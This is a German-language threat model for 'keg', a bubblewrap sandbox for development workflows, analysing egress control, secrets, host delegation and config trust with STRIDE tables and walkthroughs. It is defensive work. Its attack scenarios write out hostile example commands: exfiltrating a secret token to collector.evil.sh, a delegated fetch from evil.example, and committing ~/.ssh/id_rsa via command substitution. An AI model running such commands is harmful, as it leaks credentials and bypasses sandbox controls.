# keg — Kernel-isolated Execution with Gateways — Threat Model

> Analyse der Angriffsflächen, Vertrauensgrenzen und Gegenmaßnahmen der
> keg-Sandbox. Systembeschreibung und Architektur: siehe `CONCEPT.md`.

**Methodik:** Asset-basiert mit STRIDE-Klassifizierung · **Stand:** Konzept
(M1–M9) · **Gültigkeit:** Linux-Host, unprivilegierter User, bwrap ≥ 0.11

---

## 1. Systemzusammenfassung & Annahmen

keg kapselt Entwicklungs-Workflows in einer bubblewrap-Sandbox mit
Zero-Trust-Egress (Whitelist-Proxy, gefiltertes DNS), Dateisystem-Isolation,
Secret-Binds und optionaler Host-Delegation. Bedienung per CLI, Go-Library
oder gRPC-Daemon.

**Grundannahmen (diese gelten als gegeben, sonst ist das Modell hinfällig):**

* A1 – Der Linux-Kernel des Hosts gilt als vertrauenswürdig (keine bekannten
  unpatched Privilege-Escalations). Kernel-0days sind **nicht** im Scope;
  Härtung (`--disable-userns`, Landlock) verkleinert die Fläche, eliminiert
  sie aber nicht.
* A2 – Der aufrufende User ist kein Root und besitzt keine Rechte über seine
  normale Unix-Identität hinaus. keg gewährt niemals mehr, als der User
  ohnehin könnte.
* A3 – Die **User-Config** (`~/.config/keg/config.yaml`) ist vom
  Maschinenbesitzer kontrolliert und damit vertrauenswürdig. Die
  **Repo-Config** (`.keg.yaml`) kommt aus einem geteilten/versionierten
  Kontext und wird als **semi-vertrauenswürdig** behandelt (Angriffsfläche!).
* A4 – Der Secret-Manager-Abruf (z. B. `op`/Vault-CLI) läuft korrekt auf dem
  Host; keg prüft nur Exit-Codes und Ausgabeformat.

---

## 2. Zu schützende Assets

| # | Asset | Wert | Befindet sich |
|---|---|---|---|
| A | Quellcode & Repo-Inhalt im Workspace | hoch | Host-FS, in Sandbox rw sichtbar |
| B | Secret-Werte (`/run/secrets/*`: Tokens, DB-Passwörter) | sehr hoch | Host-Temp-Dir, ro in Sandbox |
| C | Host-Dateisystem außerhalb des Repos (~/.ssh, ~/.aws, Git-Credentials …) | sehr hoch | nur Host |
| D | Host-Umgebung/Geheimnisse in Env-Vars | hoch | nur Host (wird nie geerbt) |
| E | Egress-Policy-Reputation (Firmen-Proxy/CoreDNS-Whitelist) | mittel–hoch | Netzwerk-Gateway |
| F | Integrität geteilter Build-Caches (GOMODCACHE etc.) | hoch | Host-FS, rw in Sandbox gebunden |
| G | Host-Prozess-/Job-Integrität bei Delegation (Git-State, Container-Images) | hoch | Host |
| H | Audit-/Log-Integrität (Nachvollziehbarkeit von Allow/Deny) | mittel | Host-Stderr/Datei |
| I | Sandbox-Ressourcen (CPU/RAM/Disk gegen Noisy-Neighbor & DoS) | niedrig–mittel | Host |

---

## 3. Angreifer-Personas

| Persona | Beschreibung | Primäres Ziel |
|---|---|---|
| **P1 – Malicious Code in der Sandbox** (HAUPTBEDROHUNG) | Kompromittierte Dependency, bösartiger `postinstall`-Hook, LLM-Agent am Laufen gehijacked | Datenexfiltration (A, B), Host-Zugriff (C, D) |
| **P2 – Böswilliges Repo** | Angreifer kontrolliert `.keg.yaml` und/oder Repo-Inhalt (Supply Chain, PR von Fremdem) | Policy-Manipulation, Code-Ausführung auf dem Host (Delegation) |
| **P3 – Böswilliger API-Client** | Kompromittiertes IDE-Plugin/Skript spricht den gRPC-Daemon an | Fremdnutzung der Sandbox-Rechte, Secret-Zugriff |
| **P4 – Lokaler Mitnutzer** | Anderer User auf geteilter Maschine | Sockets lesen, Prozesse inspizieren, Layer manipulieren |
| **P5 – Netzwerk-Angreifer** | MITM zwischen Sandbox/Host und Upstream | Traffic-MitM, Proxy/Pivot-Nutzung |

---

## 4. Vertrauensgrenzen

```
TB1: Sandbox-Prozesse      ←→  Host-Kernel/Userland   (Mount+NetNS, FDs)
TB2: Sandbox               ←→  Egress-Kanäle A/B       (Socketpair + Proxy/DNS-Policy)
TB3: Delegierte Jobs       ←→  Host                    (Runner-Whitelist, Pfad-Jail)  ⚠︎ Jobs laufen AUSSERHALB der Net-Policy
TB4: API-Clients           ←→  keg-Daemon          (Unix-Socket-Rechte / Token)
TB5: Repo-Config           ←→  Policy-Engine           (Template-Kontext, Validierung)
TB6: Secret-Refresher      ←→  Secret-Manager          (Host-seitige CLI, Exit-Codes)
TB7: Host-Clients          ←→  Sandbox-Services        (Port-Rückkanal, nur 127.0.0.1,
                                                        nur deklarierte Ports)
```

---

## 5. STRIDE-Analyse je Komponente

### 5.1 Sandbox-Kern (bwrap)

| Threat | Bewertung | Maßnahme (Konzept-Referenz) |
|---|---|---|
| **S/E:** Escape aus Mount-NS (Kernel-Bug, setuid-Binary im Bind) | Niedrig (A1) aber folgenreich | `--disable-userns` (kein zweites UserNS), `/usr` ro, kein SUID-Angriffsziel durch UserNS-Disable; **Landlock als zweite Linie** (§6.1): selbst ein entkommener Prozess bleibt FS-eingeschränkt |
| **S/E:** Escape aus Mount-NS (Kernel-Bug, setuid-Binary im Bind) | Niedrig (A1) aber folgenreich | `--disable-userns` (kein zweites UserNS), `/usr` ro, kein SUID-Angriffsziel durch UserNS-Disable; **Landlock als zweite Linie** (§6.1): selbst ein entkommener Prozess bleibt FS-eingeschränkt |
| **I:** Lesen von Host-Pfaden jenseits der Binds | — | **Update (M1-Umsetzung):** Der Sandbox liegt ein `--ro-bind / /` zugrunde — der komplette Host ist **read-only** sichtbar, nicht „nicht vorhanden“ wie ursprünglich geplant. Grund: unprivilegiertes OverlayFS persistiert Upperdir-Writes zuverlässig nur mit Root-Bind als Lower-Layer (empirisch verifiziert; entspricht dem Prinzip des legacy jail-Prototyps: Host-Root als ro-Lower). Schreibzugriff bleibt auf Repo/Overlay-Layer, tmpfs `/tmp` und Sandbox-HOME beschränkt; `/home` und `/tmp` des Hosts werden per tmpfs komplett verdeckt. Sensible Dateien (~/.ssh, ~/.aws) sind damit zwar lesbar, aber nicht schreibbar/exfiltrier-bar über FS-Kanäle — Exfiltration läuft weiterhin ausschließlich über die polizeilichen Egress-Kanäle (Invarianten 1–2). Restrisiko ro-lesbarer Host-Daten ist dokumentiert und wird durch Landlock (§6.1) nicht gemildert (Landlock schreibt vor, liest standardmäßig). Optional künftige Verschärfung: selektive Root-Zusammenstellung statt Voll-Bind. |
| **D:** Fork-Bomb / Disk-Füllung (`/tmp`-tmpfs, Layer) | Mittel | `--tmpfs --size` begrenzt tmpfs; CPU/RAM-Limits sind **Residualrisiko** (§7) |
| **I/E:** Fremde FDs erben in den Workload | Niedrig | **Update (M2-Umsetzung):** Residenter Guest-Eintrypunkt — bwrap führt die keg-Binary (`/.keg`, ro-bind) aus, die als Wrapper alle Kanäle besitzt und den Workload als Kind startet. Kinder erben **exakt stdio**; Kanal-Sockets bleiben exklusiv im Guest (CLOEXEC-Scrub statt hartem Close — der würde Runtime-Netpoll-FDs zerstören). Strenger als der M1-Vertrag „stdio + Kanäle“: Der Workload kann Kanal-FDs gar nicht mehr direkt ansprechen (`TestInvariant_WorkloadGetsOnlyStdioFDs`) |
| **R:** Bestreiten von Aktionen | Niedrig | Audit-Log für Proxy/Runner/API-Entscheidungen (ohne Inhalte) |

### 5.2 Egress-Kanäle (Proxy Kanal A, DNS Kanal B)

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **S/I:** Umgehung der Domain-Whitelist | Kernbedrohung P1 | Nur Loopback im NS ⇒ physisch kein anderer Weg; Proxy lehnt unbekannte CONNECT-Targets mit 403 ab; DNS antwortet NXDOMAIN (Deny-by-default); Hosts-Mappings autoritativ vor Whitelist. **Update (M3):** Der DNS-Listener :53 läuft im keg-eigenen Wrapper-Netns (Stage-Prozess, außerhalb des bwrap-Baums); Queries werden gerahmt über fd4 zur hostseitigen Policy relayed — die private Netns hat keine Routen, der Workload kann den Kanal weder umgehen noch die Policy beeinflussen |
| **I:** DNS-Tunneling zur Exfiltration | Mittel | Whitelist + NXDOMAIN; Tunneling über *erlaubte* Domains bleibt theoretisch möglich (Residualrisiko — detektierbar per Audit-Log-Volumen) |
| **I:** DoH/DoT-Bypass | Niedrig | DoH-Endpunkte werden nicht whitelisted; ohne DNS landet der Bootstrap nicht einmal |
| **T:** IP-Literal-Dial statt DNS | — | Scheitert an `--unshare-net` (kein Routing außer Loopback). **Proxy-Modus:** IP-literale CONNECT-Ziele scheitern an der Domain-Whitelist. **Update (Transparent-Modus):** rohes TCP auf konfigurierte Ports läuft durch den Stage-Relay; die Entscheidung fällt hostseitig gegen die IP→Endpoint-Korrelation aus Kanal B — ohne korrelierten DNS-Answer wird die Verbindung geschlossen |
| **D:** Stau am DNS-Socketpair → stille Drops | Niedrig | Queued Framing statt Drop (§4.4 Backpressure-Hinweis) |
| **E:** Proxy-Redirect/Pivot (Sandbox nutzt Proxy als Sprungbrett zu Internem) | Mittel | Proxy dialt ausschließlich zum deklarierten Upstream/Firmen-Proxy; Zielprüfung vor Connect; kein generischer Forward |

#### 5.2.1 Transparent-Modus (nftables REDIRECT + Stage-Relay) — Update M3-Umsetzung

Im `network.mode: transparent` baut der keg-eigene Netns-Stage ein minimales
Netz (Pod-IP auf lo, Default-Route via lo) und redirectet TCP auf konfigurierte
Ports (:53 für UDP-DNS, :443 und `tcp_endpoints`-Ports für TCP) per nftables in
einen lokalen Relay. Der Relay synthetisiert CONNECT-Requests über Kanal A;
**alle Policy-Entscheidungen bleiben hostseitig**, die Stage hält keine Policy.
Empirisch verifizierte Design-Punkte mit Sicherheitsrelevanz:

* **Enforcement liegt im postrouting-Hook,** nicht im Output-Filter: nftables
  reroutet redirectete Pakete erst nach allen Output-Hooks — ein dortiger
  Default-Drop würde jeden Flow killen (empirisch). Postrouting sieht übersetzte
  Ziele: Nicht-Loopback-Ziele werden gedroppt, `ct state established,related`
  lässt ausschließlich Antworten bereits inspizierter Flows passieren. Neue
  Flows zu nicht redirecteten Ports/Protokollen sind damit unmöglich
  (Deny-by-default bleibt intakt; gepinnt durch `TestRulesetReader_RedirectsAndEnforcement`).
* **SO_ORIGINAL_DST statt fixer Zielannahme:** Der Relay liest die Pre-NAT-
  Destination aus dem Conntrack des Sockets. Die Workload kann Conntrack-
  Metadaten nicht manipulieren (keine Caps, eigener UserNS); fehlsame/unpassende
  Angaben ⇒ fail-closed (Verbindung zu).
* **IP→Endpoint-Korrelation:** Nur A-Antworten erlaubter Namen füllen die
  Tabelle (Kanal-B-Forwarding-Pfad); Einträge sind Port-gepinnt und laufen nach
  `DefaultRawCorrelationTTL` (30 s) ab — eine Wiederverwendung einer IP durch
  einen anderen Namen/Nutzer erbt keine Berechtigung (`TestRawEndpoints_TTLExpiry`).
* **SNI-Pfad fail-closed:** TLS ohne parsebaren ClientHello/SNI (inkl. künftiger
  ECH-Handshakes) wird geschlossen und fällt nie in den Raw-Pfad zurück;
  SNI-Policy bleibt bewusst Single-Level, DNS-Zonen-Semantik ist getrennt
  (M3-Notiz 5).
* **Quelladresswahl:** Der Stage pinnt die Host-Egress-IPv4 auf loopback; ohne
  gültige Quelle bliebe jede Verbindung bei 0.0.0.0 hängen — das ist
  Fail-Closed-Verhalten, kein Kanal entsteht.

### 5.3 Secret-Bind (§4.7)

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **I:** Secret-Diebstahl aus der Sandbox | Hoch (P1) | Grenze ist bewusst: **alles in der Sandbox kann `/run/secrets` lesen**, solange die Sandbox läuft. Minderung: enge `interval`s, Secrets nur in Sandboxes deklarieren, wo benötigt; nach `Close()` sofort vom Disk entfernt |
| **I:** Secret-Leak in Logs/Templates/Vars | Hoch | Inhalte fließen nie durch Template-Kontext, Audit oder argv; Log nur `(changed\|unchanged\|error)` |
| **T:** Race beim Refresh (halber Write sichtbar) | Niedrig | Atomarer Tausch via Temp-Datei + `rename()`; Directory-Bind macht Swap sofort sichtbar |
| **E:** Refresher läuft weiter nach Sandbox-Ende | Niedrig | Goroutinen leben im keg-Prozess; Cleanup löscht Instanz-Verzeichnis |
| **S:** Repo triggert Abruf beliebiger Secrets | Mittel | Repo deklariert nur Namen; Quelle (`cmd`, `interval`, statischer Wert) liegt ausschließlich in der vertrauenswürdigen User-Config (TB5/TB6) |
| **I:** Host-Datei als Secret in der User-Config (`secrets:`-Map) | Kontextabhängig | Optionales Feature neben `secret_sources`: Repo-Scope bleibt unverändert (nur Namen); die Host-Datei wird per ro-bind auf `/run/secrets/<name>` gereicht, nie kopiert oder in Logs/Env geführt; Doppeldefinition in `secret_sources` und `secrets` wird hart abgelehnt (eindeutige Quelle). Bindung pinnt die Inode für die Sandbox-Laufzeit — Rotation erfordert hier `secret_sources` mit `interval`, dokumentiert in CONCEPT §4.7 |

### 5.4 Delegation / Host-Runner (Kanal C) — ⚠︎ kritischste TB

**Grundsatzproblem:** Delegierte Jobs laufen auf dem **Host, außerhalb der
Sandbox-Netzwerk-Policy**. Jede Regel hier ist eine potenzielle Umgehung von
TB2.

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **E:** `git fetch https://evil.example/pwn.git` delegiert ⇒ Egress-Bypass | **Hoch** | `forbidden_args_matching` (URL-Globs) für netzwerkrelevante Raw-Regeln verpflichtende Empfehlung (§4.5); Default-Beispiel blockt `https://* http://* git@* ssh://*` |
| **E:** Beliebiges Kommando einschleusen | Hoch | Whitelist exact/prefix/raw; Raw-Matcher erlaubt nur bekannte Subcommands nach bekannter Global-Optionen-Sequenz; alles andere Exit 126 + Grund |
| **T/I:** Argument-Manipulation (Shell-Injection über Job-Argumente) | Mittel | Parameter reisen strukturiert (Length-Prefix-JSON, b64-Framing) und werden **direkt exec'd, nie durch eine Shell** geschickt |
| **Path Traversal** (`--workdir ../../…`) | Mittel | Pfad-Jail: Jobs laufen nur unter dem Host-Repo-Root |
| **I:** Git-Hook-Ausführung auf dem Host ⚠︎ | **Mittel–hoch** | Delegierte `git commit/-merge/…` können **Host-seitige Hooks** (`.git/hooks/`, `core.hooksPath`) ausführen — ein bösartiges Repo kann dort Code platzieren. Gegenmaßnahmen: Runner setzt `git -c core.hooksPath=/dev/null` (bzw. leeres Hooks-Dir) für delegierte Git-Jobs; dokumentierte Restriktion, dass Hook-abhängige Workflows manuell laufen müssen |
| **D:** Job hängt/Blockade des Runners | Niedrig | Live-Streaming, Signal-Handler killt Jobs bei Sandbox-Exit |
| **R:** Bestreiten delegierter Aktionen | Mittel | Audit pro Job: Task, Args (gekürzt), Exit-Code, UID via `SO_PEERCRED` bei API-Nutzung |

### 5.5 Config & Template-Engine (TB5)

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **E:** `.keg.yaml` schwächt Isolation (`bwrap_args: ["--share-net"]`, `--dev-bind /`) | **Hoch** (P2) | Isolation-schwächende Flags erfordern `security.allow_weak_bwrap: true` in der **User**-Config; sonst Ablehnung mit Nennung des Flags. Repo kann Isolation nur verschärfen, nie lockern |
| **E:** Template-`exec` in Repo-YAML | Hoch (konstruktiv ausgeschlossen) | Keine `exec`-Funktion im Template-Kontext; Programmausführung ausschließlich via `vars_from_exec`/`secret_sources` in der User-Config |
| **I:** Env-Injektion aus Host (`{{ .Env.AWS_… }}` exfiltrieren) | Mittel | `template_env.allow_env: false` verfügbar; geladene Werte landen nur in Sandbox-Env, wenn Repo sie explizit mapped — und die Sandbox selbst ist ja schon der Exfil-Ort; kritisch ist nur der **Host-Kontext**: Templates werden hostseitig ausgewertet, Ergebnisse gehen aber nur in die Sandbox-Konfiguration, nie zurück ans Host-System |
| **I:** Mount-Quelle zeigt auf sensible Host-Pfade (`~/.ssh`) | **Hoch** (P2) | Residualrisiko by design: Repo-deklarierte `mounts:` sind ro/rw-Binds auf Host-Pfade. Minderungen: klare Fehlermeldung + Audit bei Mounts außerhalb Repo/tmp/cache-Konventionen; Dokumentation „Repo-Config nur aus vertrauenswürdigen Quellen"; optionale User-Config-Allowlist (`mounts.allow_paths`) als Härtung (Roadmap) |
| **D:** Zirkuläre/huge Templates | Niedrig | Strict-Decoding, Timeout bei Template-Auswertung |

### 5.6 Remote-API / Daemon (§8.3, TB4)

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **S:** Fremdnutzung des Daemons durch lokalen Mitnutzer (P4) | Mittel | Default Unix-Socket mit Dir `0770`/Sockel `0660`; `SO_PEERCRED`-UID-Prüfung; TCP nur Loopback; Netz-Bind nur mit Token/mTLS, sonst Startverweigerung |
| **E:** API umgeht Policy | — (konstruktiv) | API ist nur ein anderer Treiber auf denselben Kern; keine Option schafft Freigaben über User-Config hinaus |
| **I:** Secret-Exfiltration über API | Hoch | Secret-Inhalte werden nie übertragen — nur Pfade/Existenz |
| **D:** Ressourcen-DoS (viele Sandboxen pro Caller) | Mittel | Konfigurierbare Limits paralleler Sandboxen je Aufrufer |
| **R:** Fehlende Zuschreibbarkeit | Niedrig | Audit aller Create/Exec/Stop inkl. Caller-ID, Repo, Command |

### 5.7 Caches & Layer (geteilt mit dem Host)

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **I:** Cache-Poisoning — bösartiger Build schreibt manipulierte Artefakte in `GOMODCACHE`, die **spätere Builds außerhalb der Sandbox** infizieren | **Mittel–hoch** | Bewusster Trade-off des Warm-Cache-RW-Binds. Minderungen: `--isolate-caches` (Upper-Schicht statt Host-Write) für nicht-vertrauenswürdige Läufe; `--isolated-cache-name` für pro-Profil isolierte persistente Layer; Dokumentation der Restgefahr im README |
| **T:** Layer-Manipulation zwischen Läufen (P4 lokal) | Niedrig | Layer liegen unter User-Kontrolle; Mode-000-Workdirs; Management-Kommandos mit Owner-Check |

### 5.8 Port-Rückkanal (Kanal E, TB7)

Host-Clients (z. B. Playwright) erreichen Sandbox-Services über deklarierte
Port-Forwards; Host-seitige Bindung ausschließlich auf `127.0.0.1`.

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **S/E:** Rückkanal als Exfil-Weg missbraucht | Niedrig | Datenrichtung ist inbound: Die Sandbox kann nur *annehmen*, was der Forwarder einbringt — Antworten gehen ausschließlich zum verbindenden Host-Client zurück. Ein neuer externer Weg entsteht nicht |
| **I:** Lokale Mitnutzer (P4) verbinden sich zu `127.0.0.1:<port>` | Mittel | Auf Multi-User-Maschinen sind Loopback-Ports für alle lokalen User erreichbar. Minderungen: Dokumentation als Residualrisiko; sensible Services hinter App-Auth; alternative Unix-Socket-Weitergabe statt TCP-Port (Roadmap-Option); auf Single-User-Rechnern unkritisch |
| **S:** Undeklarierte Ports exponieren | — (konstruktiv) | Deny-by-default: nur in `.keg.yaml` deklarierte Ports bekommen einen Listener; Guest-Forwarder verweigert Ziele außerhalb der Liste |
| **T:** Port-Squatting/Kollision auf dem Host | Niedrig | Kollision ⇒ klarer Fehler; `dynamic: true` + `KEG_PORT_*`-Env für kollisionssichere Vergabe |
| **I:** Sandbox-Service hält Verbindungen für lokal vertrauenswürdig | Mittel | Aus Sicht der Sandbox-App kommt jede Verbindung von `127.0.0.1` (Forwarder). Apps dürfen Loopback nicht als Authentizitätsbeweis behandeln — dokumentierte Konvention |
| **D:** Listener-Lifetime nach Sandbox-Ende | Niedrig | Listener leben im keg-Prozess, werden bei Close/Signal geschlossen |

### 5.9 Go-API / Guest-Agent (§8.2)

| Threat | Bewertung | Maßnahme |
|---|---|---|
| **E:** Control-Kanal (Kanal D) von Sandbox-Seite missbraucht, um Host-Aufrufer zu kompromittieren | Niedrig | Agent akzeptiert nur Host-initiierte Requests (Host ist Client/Server-Rolle klar zugewiesen); Socketpair ist nicht netzwerksichtig |
| **E:** Library-Nutzer überspringt Validierung | — | `Launch` führt dieselbe Policy-Pipeline wie CLI aus; kein „raw mode" |

---

## 6. Angriffsszenarien (Walkthroughs)

### S1 — Abhängigkeits-Kompromiss versucht Exfiltration (P1)

1. `npm install` startet bösen `postinstall`: liest `/run/secrets/ai_token`,
   will POST zu `https://collector.evil.sh`.
2. DNS: `collector.evil.sh` → NXDOMAIN (nicht whitelisted). ✅ blockt.
3. Fallback IP-Literal: kein Interface außer lo. ✅ blockt.
4. Fallback über erlaubten Proxy-Host als Relay: CONNECT-Target-Prüfung
   (SNI/Host ≠ Whitelist) → 403. ✅ blockt.
5. Delegierter Job als letzter Ausweg: nur whitelisted Tasks; `curl`/`wget`
   sind keine Raw-Regeln → 126. `git fetch https://…` → durch
   `forbidden_args_matching` abgelehnt. ✅ blockt.
6. **Rest:** Exfiltration über legitim erlaubte Kanäle (z. B. Push in
   whitelistedes GitHub-Repo). Detektion nur über Audit-Volumen →
   dokumentierte Residualrisiko.

### S2 — Bösartiges Repo manipuliert Policy (P2)

1. PR fügt `.keg.yaml` mit `bwrap_args: ["--share-net"]` hinzu.
2. Start auf Entwicklermaschine: Ablehnung — `security.allow_weak_bwrap`
   fehlt in dessen User-Config. ✅
3. PR fügt `mounts: [{src: "~/.ssh", dest: "/x", mode: rw}]` hinzu.
4. Start: Mount greift **innerhalb der Sandbox** (ro/rw wie deklariert).
   ⚠️ Das ist der dokumentierte Semi-Trust-Punkt: P2 kann sich so lesenden
   Zugriff auf vom User freigegebene konventionelle Pfade verschaffen —
   Härtungspfad: `mounts.allow_paths`-Allowlist (offen, §8 Roadmap).

### S3 — Delegations-Kette (P1 + P2 kombiniert)

1. Sandbox-Code ruft `just delegate git commit -m "$(cat ~/.ssh/id_rsa)"`.
2. Runner: `commit` ist erlaubt; Message ist normales Argument; Hook-
   Unterdrückung verhindert Code-Ausführung; Inhalt landet nur im Commit. ⚠️
   Datenabfluss über legitime Git-Kanäle bleibt möglich (wie S1-Rest) —
   Delegation ist bewusst ein Vertrauenskanal in beide Richtungen.

---

## 7. Residualrisiken (bewusst akzeptiert)

| Risiko | Begründung der Akzeptanz |
|---|---|
| Exfiltration über legitim whitelistede Kanäle (GitHub-Push, Package-Registry-Upload) | Funktionalität erfordert diese Kanäle; Detektion via Audit-Volumen/Review |
| Kernel-Exploits (UserNS/Mount/OverlayFS) | A1; Härtung durch `--disable-userns` + Landlock reduziert Auswirkung |
| Keine CPU/RAM/Cgroup-Limits | Für Dev-Workloads akzeptiert; Noisy-Neighbor-Risiko dokumentiert |
| Repo-deklarierte Mounts auf Host-Pfade | Semi-Trust-Modell (A3); Allowlist-Härtung geplant |
| Cache-Poisoning bei RW-Warm-Cache | Default für Speed; `--isolate-caches` als Opt-out für misstraute Läufe |
| Forwarded Ports auf 127.0.0.1 sind für alle lokalen User erreichbar (Multi-User-Maschine) | Dev-Service-Kontext akzeptiert; sensible Dienste App-Auth geben lassen oder Unix-Socket-Variante nutzen |
| DoH über falsch-whitelistede Domains | Betreiberfehler; Whitelist-Review im Prozess verankern |

---

## 8. Zusammenfassung der Sicherheitsinvarianten

1. **Nur kontrollierte Kanäle:** Jeglicher Netzverkehr der Sandbox läuft
   durch polizeilich kontrollierte Kanäle: ausgehend Proxy/DNS
   (Deny-by-default), eingehend ausschließlich der deklarierte
   Port-Rückkanal mit Host-Bind 127.0.0.1.
2. **Keine Erbe-Umgebung:** Host-Env (inkl. Proxy-/Cloud-Credentials) wird
   nie geerbt; nur explizit gesetzte Werte.
3. **Isolation nur verschärft:** Repo-Config kann bwrap nie lockern;
   Isolation-schwächende Flags brauchen User-Config-Freigabe.
4. **Ausführung braucht User-Config:** Programmausführung zur Werte-
   beschaffung (`vars_from_exec`, `secret_sources`) existiert nur im
   vertrauenswürdigen Kontext.
5. **Delegation ist explizit:** Jeder Host-Job matcht exact/prefix/raw +
   Argument-Patterns; alles andere = Exit 126 mit Grund.
6. **Secrets minimal-exponiert:** Dateien ro, atomar, kurzlebig, nie in
   Templates/Logs/API.
7. **Aufräumen garantiert:** Lifecycle hängt an FDs/Signalen — keine
   verwaisten Prozesse, Sockets, Timer oder Secret-Reste.

Abweichungen von diesen Invarianten sind sicherheitsrelevante Bugs und
müssen als solche behandelt (gemeldet, gefixt, im Modell nachgezogen)
werden.
